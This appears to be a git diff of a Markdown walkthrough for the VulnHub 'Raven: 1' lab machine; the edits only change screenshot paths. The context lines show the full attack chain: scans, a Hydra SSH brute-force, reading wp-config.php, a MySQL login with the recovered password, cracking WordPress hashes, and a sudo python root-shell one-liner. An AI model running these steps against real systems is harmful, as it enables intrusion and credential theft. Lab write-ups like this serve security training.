@@ -3,7 +3,7 @@
 - **Machine:** Raven: 1
 - **Download:** https://www.vulnhub.com/entry/raven-1,256/
 
-![](824-1.png)
+![](images/824-1.png)
 
 ---
 
@@ -23,7 +23,7 @@
 nmap -sn 192.168.2.0/24
 ```
 
-![](824-2.png)
+![](images/824-2.png)
 
 ---
 
@@ -35,7 +35,7 @@ Perform a complete scan to identify open ports, services, operating system detai
 nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.170
 ```
 
-![](824-3.png)
+![](images/824-3.png)
 
 ---
 
@@ -59,7 +59,7 @@ Run the HTTP enumeration NSE script.
 nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.170
 ```
 
-![](824-4.png)
+![](images/824-4.png)
 
 ---
 
@@ -84,7 +84,7 @@ Add the target hostname to your hosts file.
 echo "192.168.2.170 raven.local" >> /etc/hosts
 ```
 
-![](824-5.png)
+![](images/824-5.png)
 
 ---
 
@@ -96,7 +96,7 @@ Use WPScan to discover valid WordPress usernames.
 wpscan --url http://192.168.2.170/wordpress --enumerate u --wp-content-dir wp-content
 ```
 
-![](824-6.png)
+![](images/824-6.png)
 
 Discovered users:
 
@@ -117,7 +117,7 @@ Brute-force the SSH password for the discovered user.
 hydra -l michael -P /opt/rockyou.txt ssh://192.168.2.170
 ```
 
-![](824-7.png)
+![](images/824-7.png)
 
 ---
 
@@ -127,7 +127,7 @@ hydra -l michael -P /opt/rockyou.txt ssh://192.168.2.170
 ssh michael@192.168.2.170
 ```
 
-![](824-8.png)
+![](images/824-8.png)
 
 ---
 
@@ -149,7 +149,7 @@ Read the second flag.
 cat flag2.txt
 ```
 
-![](824-9.png)
+![](images/824-9.png)
 
 ---
 
@@ -165,7 +165,7 @@ cd /var/www/html/wordpress
 ls
 ```
 
-![](824-10.png)
+![](images/824-10.png)
 
 Read the WordPress configuration file.
 
@@ -173,7 +173,7 @@ Read the WordPress configuration file.
 cat wp-config.php
 ```
 
-![](824-11.png)
+![](images/824-11.png)
 
 Recovered database credentials:
 
@@ -192,7 +192,7 @@ Connect to the MySQL server.
 mysql -u root -pR@v3nSecurity
 ```
 
-![](824-12.png)
+![](images/824-12.png)
 
 Enumerate the database.
 
@@ -214,7 +214,7 @@ Dump the WordPress users table.
 SELECT * FROM wp_users;
 ```
 
-![](824-13.png)
+![](images/824-13.png)
 
 ---
 
@@ -226,7 +226,7 @@ Identify the hash type.
 hash-identifier
 ```
 
-![](824-14.png)
+![](images/824-14.png)
 
 Save the hashes.
 
@@ -234,7 +234,7 @@ Save the hashes.
 nano hashes.txt
 ```
 
-![](824-15.png)
+![](images/824-15.png)
 
 Crack the WordPress password hashes.
 
@@ -242,7 +242,7 @@ Crack the WordPress password hashes.
 john --show --format=phpass hashes.txt
 ```
 
-![](824-16.png)
+![](images/824-16.png)
 
 Recovered credentials:
 
@@ -267,7 +267,7 @@ Password:
 pink84
 ```
 
-![](824-17.png)
+![](images/824-17.png)
 
 ---
 
@@ -279,7 +279,7 @@ Check the user's sudo permissions.
 sudo -l
 ```
 
-![](824-18.png)
+![](images/824-18.png)
 
 The `steven` user can execute **Python** as **root** without supplying a password.
 
@@ -289,7 +289,7 @@ Spawn a root shell.
 sudo python -c 'import os; os.system("/bin/bash")'
 ```
 
-![](824-19.png)
+![](images/824-19.png)
 
 ---
 
